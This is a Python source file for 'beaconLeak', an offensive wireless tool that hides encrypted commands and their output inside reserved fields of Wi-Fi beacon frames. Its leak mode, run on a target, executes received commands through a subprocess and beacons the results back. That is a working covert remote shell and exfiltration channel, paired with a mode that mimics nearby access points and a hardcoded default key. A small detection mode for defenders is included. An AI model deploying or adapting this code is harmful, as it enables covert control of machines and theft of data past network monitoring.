#!/usr/bin/python
#
"""
 _                       __            _
| |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
| . | -_| .'|  _| . |   |  |__| -_| .'| '_|
|___|___|__,|___|___|_|_|_____|___|__,|_,_|
                           by cjcase [v0.8]

beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
"""
import time
import shlex
import argparse
import subprocess

import nacl.utils
import nacl.secret

from scapy.all import Dot11
from scapy.all import Dot11Beacon
from scapy.all import Dot11Elt
from scapy.all import RadioTap
from scapy.all import sniff
from scapy.all import sendp
from scapy.all import srp1
from scapy.all import hexdump


class beaconleak():
    def __init__(self, mode, iface, psk=None, **kwargs):
        # mode selection
        self.mode = mode
        # sniffing interface
        self.iface = iface        
        # used by covert
        self.beacons = {}
        # hardcoded passwords are no fun
        if not psk:
            self.psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
        else:
            self.psk = psk.encode('utf-8')
        # crypto
        self.box = nacl.secret.SecretBox(self.psk)
        # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
        self.reserved = [2, 8, 9] + [*range(17,32)] + [47, 49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
        # science
        self.detected = 0
        self.debug = kwargs.get('debug')
        # TODO: implement ssid/bssid from arguments (class)

    def cmd(self, cmd):
        args = shlex.split(cmd)
        result = subprocess.check_output(args)
        return result

    def c2(self):
        iface = self.iface
        print("[*] Using interface %s, use Ctrl+C to exit" % iface)
        while True:
            try:
                # TODO: nice-to-have: color output to terminal (interoperable)
                cmd = input("[beaconshell] >> ") 
            except KeyboardInterrupt:
                print("\n[*] Done!")
                break
            except Exception as e:
                print("[e] Something failed: " + str(e))
                continue
            # TODO: implement interactive commands for extra c2 functions
            # TODO: implement leak mode with extra measurements
            msg = cmd.encode()
            msg_e = self.box.encrypt(msg)
            if self.debug:
                print("[d] encrypted: {}".format(msg_e.hex()))
            # TODO: implement ssid/bssid from arguments (leak mode)
            # TODO: implement ssid/bssid from covert packet (tie in with args)
            ssid = 'linksys'
            bssid = '00:14:bf:de:ad:c0'
            rates = b'\x82\x84\x0b\x16'
            rsninfo = (
                b'\x01\x00'          # RSN Version 1
                b'\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
                b'\x01\x00'          # 1 Pairwise Cipher Suite
                b'\x00\x0f\xac\x04'  # AES Cipher CCMP
                b'\x01\x00'          # 1 Authentication Key Managment Suite:
                b'\x00\x0f\xac\x02'  # Pre-Shared Key
                b'\x0c\x00'          # RSN Capabilities
            )
            dot11 = Dot11(
                type=0,
                subtype=8,
                addr1='ff:ff:ff:ff:ff:ff',
                addr2=bssid,
                addr3=bssid
            )
            #beacon = Dot11Beacon(
            #    cap='ESS+privacy',
            #    timestamp=int(time.time())
            #)
            # TODO: maybe use a packet building method
            beacon = Dot11Beacon(cap='ESS+privacy')
            _ssid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
            _rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
            _rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
            _type = Dot11Elt(ID=253, info='\x01', len=1)
            _stuff = Dot11Elt(ID=254, info=msg_e, len=len(msg_e))
            frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo / _type / _stuff
            # TODO: optional bpf filtering
            # bpf = 'wlan addr2 %s' % bssid

            if self.debug:
                print("[d] scapy frame:\n{}".format(frame.command()))
                # print("[d] sniff filter:\n{}".format(bpf))
            sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
            sniff(iface=self.iface, stop_filter=self.response, timeout=5)

    def response(self, packet):
        if packet.haslayer(Dot11Elt):
            t = packet[Dot11Elt][3].ID
            if packet.addr2 == '00:14:bf:de:ad:c0' and t == 128:
                crypted = packet[Dot11Elt][4].info
                if self.debug:
                    print("[d] response packet:\n{}".format(packet.command()))
                    print("[d] received:{}".format(crypted.hex()))
                try:                    
                    msg = self.box.decrypt(crypted)
                    print(msg.decode('utf-8'))
                except Exception as e:
                    print("[e] Could not decrypt, wrong PSK or error in received beacon!")
                    if self.debug:
                        print("[d] error:\n" + str(e))
                return True

    def magic(self, packet):
        if packet.haslayer(Dot11Elt):
            # TODO: redo target logic using new implemented detection method
            if packet.addr2 == '00:14:bf:de:ad:c0' and packet[Dot11Elt][3].ID == 253:
                crypted = packet[Dot11Elt][4].info
                if self.debug:
                    print("[d] received:{}".format(crypted.hex()))
                cmd = ''
                try:
                    cmd = self.box.decrypt(crypted)
                except Exception as e:
                    if self.debug:
                        print("[e] Could not decrypt, wrong PSK or error in received beacon!")
                        print("[e] " + str(e))
                if cmd:
                    try:
                        result = self.cmd(cmd.decode('utf-8'))
                    except Exception as e:
                        result=b"[e] Command failed"
                        if self.debug:
                            print("[d] Command Failed:\n" + str(e))
                    if self.debug:
                        print("[d] Command Result:\n{}".format(result.decode('utf-8')))
                    result_e = self.box.encrypt(result)
                    packet[Dot11Elt][3] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e)) / Dot11Elt(ID=255, info=b'\x01\x01\x01\x01', len=4)
                    if self.debug:
                        print("[d] sending:{}".format(result_e.hex()))
                        print("[d] response packet:\n{}".format(packet.command()))
                    time.sleep(2)
                    sendp(packet, iface=self.iface, verbose=int(self.debug))
                else:
                    #command not received correctly or fake
                    pass
            else:
                # covert case here
                pass

    def sniff(self, pcap=False):
        iface = self.iface
        try:
            if self.mode == "leak":
                sniff(iface=iface, prn=self.magic)
            elif self.mode == "mon":
                if pcap:
                    print("[*] Starting offline capture analysis")
                    sniff(offline=pcap, prn=self.detect)
                else:
                    print("[*] Starting live monitoring mode")
                    sniff(iface=iface, prn=self.detect)
        except OSError as e:
                print("[e] interface {} not found, maybe you meant {}mon?".format(iface,iface))

    def clone(self, packet):
        if packet.haslayer(Dot11Beacon):
            try:
                extra = packet.notdecoded
                rssi = -(256 - ord(extra[-4:-3]))
            except Exception:
                rssi = -100
            self.beacons[packet.addr2] = (rssi, packet)

    # this one is elite
    def covert(self):
        print("[*] Covert mode enabled:")
        # sniff frames around me
        print("\t[i] probing for surrounding beacons...")
        sniff(iface=self.iface, prn=self.clone, count=20, timeout=10)
        # choose noisier one
        print("\t[i] checking results:")
        check = -100
        best = [0]
        for bssid, val in self.beacons.items():
            rssi, packet = val
            if rssi > check:
                check = rssi
                best.pop()
                best.append(packet)
            print("\t\t{} | {} | {}".format(str(packet.info), bssid, rssi))
        # imitate it
        packet = best.pop()
        print("\t[i] using {}({} dBm)".format(str(packet.info), check))
        if self.debug:
            print("[d] packet:\n{}".format(packet.command()))
        # TODO: should we really return or take a more OOP approach?
        return packet

    # this is for the blue teamers
    def detect(self, packet):
        if packet.haslayer(Dot11Beacon):
            elements = packet.getlayer(Dot11Elt)
            #if self.debug:
            #    print(packet.command())
            while elements:
                if elements.ID in self.reserved:
                    # some beacon stuffing was found in the wild for elemnt 47, investigate further
                    # TODO: implement syslog functionality for IoCs
                    print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(packet[Dot11Beacon].info.decode('utf-8'), elements.ID))
                    self.detected += 1
                    if self.debug:
                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
                elements = elements.payload.getlayer(Dot11Elt)


if __name__ == '__main__':
    banner = """
     _                       __            _
    | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
    | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
    |___|___|__,|___|___|_|_|_____|___|__,|_,_|
                               by cjcase [v0.8]\n
    """
    parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
    modes = parse.add_argument_group('modes')
    mutex = modes.add_mutually_exclusive_group(required=True)
    mutex.add_argument(
        '--leak', 
        help='(target) Leak data mode.',
        action='store_true'
    )
    mutex.add_argument(
        '--mon',
        help='(detect) Check surroundings for possible attacks',
        action='store_true'
    )
    mutex.add_argument(
        '--c2',
        help='(attack) Command & control, remote shell',
        action='store_true'
    )
    optional_arguments = {
        '--covert': 'Hide in plain sight by mimicking surrounding beacons',
        '--debug': 'Debug verbosity.',
    }
    for arg, txt in optional_arguments.items():
        parse.add_argument(arg, help=txt, action='store_true')

    # extra options
    parse.add_argument('--ssid', help='Emulated station WiFi name') # TODO: implement ssid/bssid from arguments
    parse.add_argument('--bssid', help='Emulated station MAC address') # TODO: implement ssid/bssid from arguments
    parse.add_argument('--psk', help='Custom encryption passphrase')
    parse.add_argument('--pcap', nargs='+', help='pcap file(s) for offline beacon analysis')

    # Logging options
    parse.add_argument('--loglevel', help='log level, lowest is critical') # TODO

    parse.add_argument('iface', help='Wireless interface in monitor mode')
    args = parse.parse_args()

    # covert mode
    packet = None
    if args.covert:
        print(banner)
        bl = beaconleak('covert', args.iface, debug=args.debug)
        packet = bl.covert()
    # leak mode
    if args.leak:
        bl = beaconleak('leak', args.iface, debug=args.debug, psk=args.psk)
        bl.sniff()
    # c2 mode
    elif args.c2:
        print(banner)
        if args.psk:
            print("[*] Using custom key, set up leaker to use it too.")
        bl = beaconleak('c2', args.iface, debug=args.debug, psk=args.psk)
        bl.c2()
    # detect mode
    elif args.mon:
        bl = beaconleak('mon', args.iface, debug=args.debug)
        print(banner)
        bl.sniff(pcap=args.pcap)
